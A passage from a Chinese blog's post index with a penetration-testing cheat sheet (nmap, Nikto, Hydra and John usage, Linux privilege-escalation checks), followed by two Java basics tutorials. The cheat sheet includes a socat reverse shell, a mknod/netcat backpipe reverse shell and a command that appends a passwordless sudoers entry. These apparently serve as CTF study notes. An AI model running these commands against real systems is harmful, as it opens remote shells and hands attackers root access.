      </categories>
      <tags>
        <tag>Tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Enumeration</title>
    <url>/Other/6.Linux-Enumeration/</url>
    <content><![CDATA[<blockquote>
<p>更新中…</p>
</blockquote>
<h1 id="Linux-Enumeration">Linux Enumeration</h1>
<h2 id="信息搜集">信息搜集</h2>
<h3 id="Nmap">Nmap</h3>
<p>使用手册：<a href="https://www.stationx.net/nmap-cheat-sheet/">https://www.stationx.net/nmap-cheat-sheet/</a></p>
<h4 id="常用参数">常用参数</h4>
<p>Target Selection:</p>
<p><strong>nmap 192.168.0.1</strong>(scanning a single ip address)<br>
<strong>nmap ca0y1h.top</strong>(scanning an url directly)<br>
<strong>nmap 192.168.0.0/24</strong>(scan a range of IPs (192.168.0.0-255))<br>
<strong>nmap -iL list-of-ips.txt</strong>(scan a list of ip)</p>
<p>Port Selection:</p>
<p><strong>nmap 127.0.0.1 -p 22</strong>(scanning the default SSH port)<br>
<strong>nmap 127.0.0.1 -p 1-1024</strong>(scanning ports 1 2 3…1024)<br>
<strong>nmap 127.0.0.1 -F</strong>(scanning the most 100 common ports (80,22,21,443,etc))<br>
<strong>nmap 127.0.0.1 -F --top-ports 30000</strong><br>
<strong>nmap 127.0.0.1 -p-</strong>(all ports)</p>
<p>Port Scan Types:</p>
<p><strong>nmap 127.0.0.1 -sT</strong> (using TCP (used by default))<br>
<strong>nmap 127.0.0.1 -sS</strong> (TCP SYN scan)<br>
<strong>nmap 127.0.0.1 -sU</strong> (UDP ports)<br>
<strong>nmap 127.0.0.1 -Pn -F</strong> (skip the initial ping step)</p>
<p>Service &amp; OS Detection</p>
<p><strong>nmap 127.0.0.1 -A</strong>(detect OS &amp; services)<br>
<strong>nmap 127.0.0.1 -sV</strong>(enumerate versions)<br>
<strong>nmap 127.0.0.1 -sC</strong>(using default scripts)<br>
<strong>nmap 127.0.0.1 -sV --version-intensity 5</strong>(Aggressive service detection)<br>
<strong>nmap 127.0.0.1 -sV --version-intensity 0</strong>(Light banner grabbing detection)</p>
<p><strong>nmap 127.0.0.1 -T0</strong>(paranoid detection evasion)<br>
<strong>nmap 127.0.0.1 -T1</strong>(sneaky detection evasion)<br>
<strong>nmap 127.0.0.1 -T2</strong>(polite (slows down scan, less bandwidth &amp; less target ressources))<br>
<strong>nmap 127.0.0.1 -T3</strong>(default speed)<br>
<strong>nmap 127.0.0.1 -T4</strong>(Aggressive (fast &amp; reliable network))<br>
<strong>nmap 127.0.0.1 -T5</strong>(Insane speeds (assumes low ping and high bandwidth))</p>
<p><strong>nmap 127.0.0.1 --host-timeout 1h 2m 3s</strong>(sets timeout to 1hr2min3sec)<br>
<strong>nmap 127.0.0.1 --min-parallelism 10</strong>(minimal probe parallelization)<br>
<strong>nmap 127.0.0.1 --max-parallelism 50</strong>(maximal ^)<br>
<strong>nmap 127.0.0.1 --max-retries 3</strong><br>
<strong>nmap 127.0.0.1 --min-rate</strong> (send packets at least _ per second)</p>
<h4 id="Python-Script-Scan">Python Script Scan</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">ip &#x3D; input(&quot;[+]Target IP: &quot;)</span><br><span class="line"></span><br><span class="line">ippsec &#x3D; &quot;ippsec_scan.txt&quot;</span><br><span class="line">service &#x3D; &quot;service_scan.txt&quot;</span><br><span class="line">script &#x3D; &quot;script_scan.txt&quot;</span><br><span class="line">all_tcp &#x3D; &quot;all_tcp_scan.txt&quot;</span><br><span class="line">all_udp &#x3D; &quot;all_tcp_scan.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ippsec_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting ippsec_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-sC&quot;, &quot;-sV&quot;, &quot;-oN&quot;, ippsec, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def service_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting service_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-A&quot;, &quot;-p-&quot;, &quot;-oN&quot;, service, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def script_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting script_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;--script&quot;, &quot;discovery, safe, vuln&quot;, &quot;-oN&quot;, script, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def alltcp_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting all_tcp_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-oN&quot;, all_tcp, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def alludp_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting all_udp_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-sU&quot;, &quot;-oN&quot;, all_udp, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ippsec_scan(ip)</span><br><span class="line">    service_scan(ip)</span><br><span class="line">    script_scan(ip)</span><br><span class="line">    alltcp_scan(ip)</span><br><span class="line">    alludp_scan(ip)</span><br></pre></td></tr></table></figure>
<h3 id="Netdiscover">Netdiscover</h3>
<h3 id="Nikto">Nikto</h3>
<p>项目地址：<a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
<p>工具介绍：perl语言开发的开源WEB安全扫描器；识别网站软件版本；搜索存在安全隐患的文件；检查服务器配置漏洞；检查WEB Application层面的安全隐患；避免404误判依据响应文件内容判断，不同扩展名的文件404响应内容不同。</p>
<p>常用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nikto -host http:&#x2F;&#x2F;1.1.1.1 #扫描目标：域名方式；</span><br><span class="line">Nikto -host http:&#x2F;&#x2F;1.1.1.1 -output #扫描并输出结果</span><br><span class="line">Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</span><br><span class="line">Nikto -host www.baidu.com -port 443 -ssl #扫描https网站</span><br><span class="line">Nikto -host 文件名.txt #批量扫描目标</span><br><span class="line">nmap -p80 192.168.1.0&#x2F;24 -oG - | nikto -host - #利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</span><br><span class="line">nikto -host 192.168.0.1 -useproxy http:&#x2F;&#x2F;localhost:8070 #利用代理进行扫描</span><br><span class="line">-vhost #当一个网站存在多个端口时可以使用-vhost遍历所有网站进行扫描或一个ip对应多个网站</span><br></pre></td></tr></table></figure>
<h3 id="GitHack">GitHack</h3>
<p>项目地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>工具介绍：GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p>
<p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>
<h3 id="dirb">dirb</h3>
<h3 id="Wfuzz">Wfuzz</h3>
<p>项目地址：<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
<p>工具介绍：wfuzz是一个基于Python的Web爆破程序，它支持多种方法来测试WEB应用的漏洞。你可以审计参数、登录认证、GET/POST方式爆破的表单，并且可以发掘未公开的资源，比如目录、文件和头部之类的。</p>
<p>使用手册：<a href="https://www.fuzzer.xyz/2019/03/29/WFUZZ%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://www.fuzzer.xyz/2019/03/29/WFUZZ使用教程/</a></p>
<h3 id="subDomainBrute">subDomainBrute</h3>
<p>项目地址：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>工具介绍：本工具用于渗透测试目标域名收集。高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa。</p>
<h3 id="Pigat">Pigat</h3>
<p>项目地址：<a href="https://github.com/teamssix/pigat">https://github.com/teamssix/pigat</a></p>
<p>工具介绍：被动信息收集聚合工具，该工具通过爬取目标URL在第三方网站比如备案查询网站、子域名查询网站的结果来对目标进行被动信息收集。</p>
<h2 id="密码爆破">密码爆破</h2>
<h3 id="hash-identifier">hash-identifier</h3>
<p>项目地址：<a href="https://tools.kali.org/password-attacks/hash-identifier">https://tools.kali.org/password-attacks/hash-identifier</a></p>
<p>工具介绍：hash-identifier是一款哈希算法识别工具。通过该工具，用户可以识别哈希值所使用的哈希算法。</p>
<h3 id="hashcat">hashcat</h3>
<h3 id="John-The-Ripper">John The Ripper</h3>
<p>项目地址：<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></p>
<p>使用示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
<h3 id="Hydra">Hydra</h3>
<p>项目地址：<a href="https://tools.kali.org/password-attacks/hydra">https://tools.kali.org/password-attacks/hydra</a></p>
<p>工具介绍：这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。</p>
<p>详细使用方式：<a href="https://www.cnblogs.com/zhaijiahui/p/8371336.html">https://www.cnblogs.com/zhaijiahui/p/8371336.html</a></p>
<p>使用示例：</p>
<p><strong>Web登录 GET方式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p><strong>Web登录 POST方式</strong></p>
<p><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/</a></p>
<h2 id="数字取证">数字取证</h2>
<h3 id="Steghide">Steghide</h3>
<p>使用手册：<a href="http://steghide.sourceforge.net/documentation/manpage.php">http://steghide.sourceforge.net/documentation/manpage.php</a></p>
<p>常用命令：</p>
<p>隐写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide embed -cf picture.jpg -ef secret.txt</span><br></pre></td></tr></table></figure>
<p>提取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf picture.jpg</span><br></pre></td></tr></table></figure>
<h3 id="exiftool">exiftool</h3>
<p>项目地址：<a href="https://github.com/exiftool/exiftool">https://github.com/exiftool/exiftool</a></p>
<p>使用手册：<a href="https://www.jianshu.com/p/d76457799de1">https://www.jianshu.com/p/d76457799de1</a></p>
<h2 id="提权脚本">提权脚本</h2>
<h3 id="LinEnum">LinEnum</h3>
<p>项目地址：<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
<p>使用示例：<code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</code></p>
<p>参数：</p>
<ul>
<li>-k Enter keyword</li>
<li>-e Enter export location</li>
<li>-t Include thorough (lengthy) tests</li>
<li>-s Supply current user password to check sudo perms (INSECURE)</li>
<li>-r Enter report name</li>
<li>-h Displays this help text</li>
</ul>
<p>Running with no options = limited scans/no output file</p>
<ul>
<li>-e Requires the user enters an output location i.e. /tmp/export. If this location does not exist, it will be created.</li>
<li>-r Requires the user to enter a report name. The report (.txt file) will be saved to the current working directory.</li>
<li>-t Performs thorough (slow) tests. Without this switch default ‘quick’ scans are performed.</li>
<li>-s Use the current user with supplied password to check for sudo permissions - note this is insecure and only really for CTF use!</li>
<li>-k An optional switch for which the user can search for a single keyword within many files (documented below).</li>
</ul>
<h3 id="pspy">pspy</h3>
<p>项目地址：<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<p>项目介绍：pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
<h2 id="提权命令">提权命令</h2>
<p>提权思路总结：<a href="https://blog.theshahzada.com/2021/01/linux-privilege-escalation.html">https://blog.theshahzada.com/2021/01/linux-privilege-escalation.html</a></p>
<ul>
<li>
<p>Find World Writable Folders</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -xdev -type d -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find World Writable Files</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -xdev -type f -perm -0002 -ls 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find SUIDs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find SGID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -2000 -group root -exec ls -ld &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>DIstro Information</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*-release</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check open ports</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -antup</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check processes</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -elf</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Process monitoring tool: <a href="https://github.com/DominicBreuker/pspy">pspy</a></p>
<ul>
<li>Useful for monitoring chron jobs or any other scheduled jobs</li>
</ul>
</li>
<li>
<p>Check processes running with root privileges</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -elf | grep root</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check running services</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;services</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check installed packages</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check for sudo permissions</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check OS architecture</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check cronjobs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check fstab</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;fstab</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check network configuration</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check contents of <code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Using socat</p>
<ul>
<li>
<p>Listen</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Connect</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>Reverse connection using mknod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod &#x2F;tmp&#x2F;backpipe p; &#x2F;bin&#x2F;sh 0&lt; &#x2F;tmp&#x2F;backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt; &#x2F;tmp&#x2F;backpipe; rm &#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Check version of an installed application</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l &lt;application name&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Sometimes checking <code>/opt</code> <code>/tmp</code> <code>/var</code> <code>/usr</code> might help.</p>
</li>
<li>
<p>Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Reverse-Shell">Reverse Shell</h2>
<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<h2 id="常用工具">常用工具</h2>
<h3 id="SQLMAP">SQLMAP</h3>
<p><a href="https://zerokeeper.com/web-security/sqlmap-usage-summary.html#">https://zerokeeper.com/web-security/sqlmap-usage-summary.html#</a></p>
<p><a href="https://louisnie.github.io/2019/03/03/SQLMAP/">https://louisnie.github.io/2019/03/03/SQLMAP/</a></p>
]]></content>
      <categories>
        <category>技术随笔</category>
      </categories>
      <tags>
        <tag>Linux Enumeration</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之JDK、JRE、JVM</title>
    <url>/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM/</url>
    <content><![CDATA[<h1 id="Java基础学习之JDK、JRE、JVM">Java基础学习之JDK、JRE、JVM</h1>
<p>最近帮一个师兄做Cisco的软件工程师面试题，发现还问到了JDK、JRE和JVM之间的关系，虽然看起来比较基础，但是对这个概念还是很模糊，没有形成一个有效的框架，借用廖雪峰师傅的一张图来说明，一图胜千言。</p>
<p><img src="https://i.loli.net/2019/09/23/nzXvPx8OUaHZftM.png" alt=""></p>
<ul>
<li>JDK：Java Develop Kit</li>
<li>JRE：Java Runtime Environment</li>
</ul>
<p>简单地说，JRE就是运行Java字节码的虚拟机。但是，如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p>
<p>再贴一张Java执行代码过程的图：</p>
<p><img src="https://i.loli.net/2019/09/23/moDQOvws792jehT.png" alt=""></p>
<p>这里再简单的说一下<strong>Java 为什么能跨平台，实现一次编写，多处运行？</strong></p>
<p>Java 能够跨平台运行的核心在于 JVM 。不是 Java 能够跨平台，而是它的 jvm 能够跨平台。 Java 引入了字节码的概念，jvm 只能认识字节码，并将它们解释到系统的 API 调用。针对不同的系统有不同的 jvm 实现，有 Linux 版本的 jvm 实现，也有 Windows 版本的 jvm 实现，但是同一段代码在编译后的字节码是一样的。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之面向对象基础</title>
    <url>/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Java基础学习之面向对象基础">Java基础学习之面向对象基础</h1>
<h3 id="方法">方法</h3>
<h4 id="可变参数">可变参数</h4>
<p>可变参数用<code>类型...</code>定义，可变参数相当于数组类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNames</span><span class="params">(String... names)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.names = names</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参数绑定">参数绑定</h4>
<p>Java中的参数绑定其实也就是传值传递和传址传递。</p>
<p>我们先观察一个基本类型参数的传递：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">15</span>; <span class="comment">// n的值为15</span></span><br><span class="line">        p.setAge(n); <span class="comment">// 传入n的值</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15</span></span><br><span class="line">        n = <span class="number">20</span>; <span class="comment">// n的值改为20</span></span><br><span class="line">        System.out.println(p.getAge()); <span class="comment">// 15</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从结果可知，修改外部的局部变量<code>n</code>，不影响实例<code>p</code>的<code>age</code>字段，原因是<code>setAge()</code>方法获得的参数，复制了<code>n</code>的值，因此，<code>p.age</code>和局部变量<code>n</code>互不影响。</p>
<p><strong>结论：基本类型参数的传递，是调用方值的复制。双方各自的后续修改，互不影响。</strong></p>
<p>我们再看一个传递引用参数的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        String[] fullname = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;Homer&quot;</span>, <span class="string">&quot;Simpson&quot;</span> &#125;;</span><br><span class="line">        p.setName(fullname); <span class="comment">// 传入fullname数组</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Homer Simpson&quot;</span></span><br><span class="line">        fullname[<span class="number">0</span>] = <span class="string">&quot;Bart&quot;</span>; <span class="comment">// fullname数组的第一个元素修改为&quot;Bart&quot;</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bart Simpson&quot;?</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.name[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String[] name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到<code>setName()</code>的参数现在是一个数组。一开始，把<code>fullname</code>数组传进去，然后，修改<code>fullname</code>数组的内容，结果发现，实例<code>p</code>的字段<code>p.name</code>也被修改了！</p>
<p><strong>结论：引用类型参数的传递，调用方的变量，和接收方的参数变量，指向的是同一个对象。双方任意一方对这个对象的修改，都会影响对方</strong></p>
<p>再来看一个引用类型的参数绑定：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        String bob = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">        p.setName(bob); <span class="comment">// 传入bob变量</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// &quot;Bob&quot;</span></span><br><span class="line">        bob = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// bob改名为Alice</span></span><br><span class="line">        System.out.println(p.getName()); <span class="comment">// 注意：还是&quot;Bob&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>String[] fullname</code>传递给<code>p.name</code>的是堆中的地址，共同操作堆中的内容。<code>bob</code>传递给<code>p.name</code>以后两者均指向常量池的<code>Bob</code>，后<code>bob</code>指向了常量池中的<code>Alice</code>，但是<code>p.name</code>仍然指向<code>Bob</code>，再一次 <code>p.setName(bob);</code>的话<code>p.name</code>将指向<code>Alice</code>。</p>
<h3 id="构造方法">构造方法</h3>
<h4 id="默认构造方法">默认构造方法</h4>
<p>在Java中，创建对象实例的时候，按照如下顺序进行初始化：</p>
<ol>
<li>先初始化字段，例如，<code>int age = 10;</code>表示字段初始化为<code>10</code>，<code>double salary;</code>表示字段默认初始化为<code>0</code>，<code>String name;</code>表示引用类型字段默认初始化为<code>null</code>；</li>
<li>执行构造方法的代码进行初始化。</li>
</ol>
<h4 id="多构造方法">多构造方法</h4>
<p>可以定义多个构造方法，在通过<code>new</code>操作符调用的时候，编译器通过构造方法的参数数量、位置和类型自动区分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果调用<code>new Person(&quot;Xiao Ming&quot;, 20);</code>，会自动匹配到构造方法<code>public Person(String, int)</code>。</p>
<p>如果调用<code>new Person(&quot;Xiao Ming&quot;);</code>，会自动匹配到构造方法<code>public Person(String)</code>。</p>
<p>如果调用<code>new Person();</code>，会自动匹配到构造方法<code>public Person()</code>。</p>
<p>一个构造方法可以调用其他构造方法，这样做的目的是便于代码复用。调用其他构造方法的语法是<code>this(…)</code>：</p>
